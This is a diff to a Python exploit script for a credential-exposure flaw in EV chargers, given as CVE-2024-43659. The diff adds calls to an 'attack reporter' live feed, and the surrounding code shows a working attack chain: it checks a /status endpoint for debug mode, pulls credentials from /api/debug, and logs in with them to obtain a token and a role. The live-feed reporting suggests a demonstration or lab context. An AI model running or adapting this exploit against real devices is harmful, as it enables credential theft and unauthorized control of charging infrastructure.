@@ -20,15 +20,39 @@ import requests
 import json
 import sys
 
+# Import attack reporter for live feed
+try:
+    from attack_reporter import report_attack, report_step, report_success, report_failure, report_command, report_data
+    HAS_REPORTER = True
+except ImportError:
+    HAS_REPORTER = False
+    def report_attack(*args, **kwargs): pass
+    def report_step(*args, **kwargs): pass
+    def report_success(*args, **kwargs): pass
+    def report_failure(*args, **kwargs): pass
+    def report_command(*args, **kwargs): pass
+    def report_data(*args, **kwargs): pass
+
 
 class CredentialExposureExploit:
     def __init__(self, target: str, port: int):
         self.base_url = f"http://{target}:{port}"
+        self.target_str = f"{target}:{port}"
         self.credentials = {}
+        
+        # Report attack start
+        report_attack(
+            cve="CVE-2024-43659",
+            name="EV Charger Credential Exposure",
+            severity="critical",
+            target=self.target_str,
+            attack_type="credential_exposure"
+        )
         
     def check_vulnerable(self) -> bool:
         """Check if target is vulnerable"""
         print(f"[*] Checking target: {self.base_url}")
+        report_step(f"Checking {self.base_url}/status for debug mode")
         try:
             resp = requests.get(f"{self.base_url}/status", timeout=10)
             if resp.status_code == 200:
@@ -40,10 +64,12 @@ class CredentialExposureExploit:
                 
                 if data.get('debug_mode'):
                     print("[+] DEBUG MODE ENABLED - Likely vulnerable!")
+                    report_success("Debug mode enabled - credentials likely exposed!")
                     return True
             return False
         except requests.exceptions.RequestException as e:
             print(f"[-] Connection error: {e}")
+            report_failure(f"Connection failed: {e}")
             return False
     
     def exploit_debug_endpoint(self) -> dict:
@@ -51,6 +77,7 @@ class CredentialExposureExploit:
         Extract credentials from debug endpoint
         """
         print("\n[*] Accessing debug endpoint...")
+        report_step("Accessing /api/debug for exposed credentials", severity="critical")
         
         try:
             resp = requests.get(f"{self.base_url}/api/debug", timeout=10)
@@ -65,6 +92,7 @@ class CredentialExposureExploit:
                         print(f"    {key}: {value}")
                         self.credentials[key] = value
                     print("-" * 40)
+                    report_data("credentials", creds, "Credentials extracted from debug endpoint!")
                 
                 network = data.get('network', {})
                 if network:
@@ -163,6 +191,7 @@ class CredentialExposureExploit:
         Attempt to login with discovered credentials
         """
         print(f"\n[*] Attempting login with {username}:{password}...")
+        report_step(f"Attempting login with {username}:****", severity="high")
         
         try:
             resp = requests.post(
@@ -177,6 +206,7 @@ class CredentialExposureExploit:
                     print(f"[+] LOGIN SUCCESSFUL!")
                     print(f"    Token: {data.get('token')}")
                     print(f"    Role: {data.get('role')}")
+                    report_success(f"Login successful as {username} with role {data.get('role')}")
                     return True
             
             print("[-] Login failed")
